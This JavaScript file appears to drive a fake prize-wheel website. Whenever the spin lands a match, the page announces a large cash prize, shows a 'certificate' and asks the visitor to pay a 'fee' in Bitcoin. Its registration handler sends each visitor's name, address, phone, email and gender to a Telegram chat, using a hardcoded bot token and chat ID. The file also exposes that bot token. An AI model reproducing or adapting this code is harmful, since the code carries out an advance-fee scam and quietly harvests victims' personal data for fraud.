const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
const TELEGRAM_CHAT_ID = "874563737"; // Replace this with your actual chat ID
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const spinBtn = document.querySelector('.spin-btn'),
      stopBtn = document.querySelector('.stop-btn'),
      spin1 = document.querySelector('.spinner-1'),
      spin2 = document.querySelector('.spinner-2'),
      spin3 = document.querySelector('.spinner-3'),
      spinSymbols = Array.from(spin1.querySelectorAll('.symbol'));

let stopWheel = false,
    canSpin = true,
    jackpot = false;

const spinners = [
    { id: spin1, delaySpin: 1000, acceleration: 1.2, rotSpin: 0 },
    { id: spin2, delaySpin: 1000, acceleration: 1.1, rotSpin: 0 },
    { id: spin3, delaySpin: 1000, acceleration: 1.075, rotSpin: 0 }
];

const spin = () => {
    if (canSpin) {
        for (let i = 0; i < spinners.length; i++) {
            spinWheel(spinners[i]);
        }
        btnPushed(spinBtn, true);
        if (jackpot) {
            document.querySelector('.machine-title').classList.remove('jackpot');
            jackpot = false;
        }
    }
    canSpin = false;
};

const stop = () => {
    if (!canSpin) {
        stopWheel = true;
        btnPushed(stopBtn, true);
    }
};

const spinWheel = (spinner) => {
    let firstWheel = true;

    const wheelInterval = setInterval(() => {
        const formerDelay = spinner.delaySpin;

        stopWheel ? spinner.delaySpin *= spinner.acceleration : spinner.delaySpin > 125 && (spinner.delaySpin /= spinner.acceleration);

        firstWheel ? (stoDelay = 0, firstWheel = false) : stoDelay = spinner.delaySpin;

        setTimeout(() => {
            spinner.rotSpin -= 30;
            spinner.id.style.setProperty('--rot-spin', spinner.rotSpin + 'deg');
            spinner.id.style.setProperty('--rot-speed', (spinner.delaySpin / 1000) + 's');
        }, stoDelay);

        spinner.delaySpin >= 1000 && (
            clearInterval(wheelInterval),
            spinner.id.dataset.id === "3" && checkSymbols(spinner.delaySpin),
            spinner.delaySpin = formerDelay
        );
    }, 100);
};

const btnPushed = (btn, pushed) => {
    btn.style.setProperty('--btn-bottom', pushed ? '5%' : '12.5%');
    btn.style.cursor = pushed ? 'not-allowed' : "pointer";
};

const checkSymbols = (delay) => {
    setTimeout(() => {
        const getSymbol = (i) => {
            return spinSymbols[((-30 - spinners[i].rotSpin) / 30) % 12].dataset.value;
        };

        const symbol1 = getSymbol(0),
              symbol2 = getSymbol(1),
              symbol3 = getSymbol(2);

        if (symbol1 === symbol2 && symbol1 === symbol3) {
            console.log('you win');
            document.querySelector('.machine-title').classList.add('jackpot');
            jackpot = true;
            displayResult(symbol1);
        } else {
            console.log('you lose');
        }

        stopWheel = false;
        canSpin = true;
        btnPushed(spinBtn, false);
        btnPushed(stopBtn, false);

    }, 125 + delay * 2);
};

const displayResult = (prizeValue) => {
    const prize = prizes.find(p => p.amount === prizeValue);

    const resultElement = document.getElementById('result');
    resultElement.innerText = `🎉 Congratulations! You have won ${prize.amount}!`;
    showCertificate(prize);
};

const prizes = [
    { amount: '$50,000.00', fee: '$500' },
    { amount: '$100,000.00', fee: '$1000' },
    { amount: '$125,000.00', fee: '$1250' },
    { amount: '$150,000.00', fee: '$1500' },
    { amount: '$175,000.00', fee: '$1750' },
    { amount: '$200,000.00', fee: '$2000' },
    { amount: '$250,000.00', fee: '$2500' },
    { amount: '$300,000.00', fee: '$3000' },
    { amount: '$450,000.00', fee: '$4500' },
    { amount: '$500,000.00', fee: '$5000' },
    { amount: '$600,000.00', fee: '$6000' },
    { amount: '$800,000.00', fee: '$8000' },
    { amount: '$850,000.00', fee: '$8500' },
    { amount: '$900,000.00', fee: '$9000' },
    { amount: '$1,000,000.00', fee: '$10000' }
];

const showCertificate = (prize) => {
    const registrationData = getRegistrationData();
    document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
    document.getElementById('paymentAmount').innerText = prize.fee;
    document.getElementById('certificate').style.display = 'block';
};

const getRegistrationData = () => {
    return JSON.parse(localStorage.getItem('registrationData'));
};

if (document.getElementById('downloadCertificate')) {
    document.getElementById('downloadCertificate').addEventListener('click', function() {
        const certificateText = document.getElementById('certificateText').innerText;
        const blob = new Blob([certificateText], { type: 'text/plain' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = 'certificate.txt';
        link.click();
    });
}

if (document.getElementById('payBitcoin')) {
    document.getElementById('payBitcoin').addEventListener('click', function() {
        window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
    });
}

if (document.getElementById('bitcoinPaymentForm')) {
    document.addEventListener('DOMContentLoaded', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount');
        if (document.getElementById('amount')) {
            document.getElementById('amount').value = amount;
        }
    });

    document.getElementById('bitcoinPaymentForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const paymentData = new FormData(e.target);
        const paymentInfo = {};
        paymentData.forEach((value, key) => {
            paymentInfo[key] = value;
        });

        alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
    });
}

document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(e.target);
    const registrationData = {};
    formData.forEach((value, key) => {
        registrationData[key] = value;
    });

    localStorage.setItem('registrationData', JSON.stringify(registrationData));

    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    }).then(response => response.json()).then(data => {
        if (data.ok) {
            document.getElementById('registration').style.display = 'none';
            document.getElementById('gameSelection').style.display = 'block';
        } else {
            alert('Registration failed. Please try again.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Registration failed. Please try again.');
    });
});

spinBtn.addEventListener('click', spin);
stopBtn.addEventListener('click', stop);
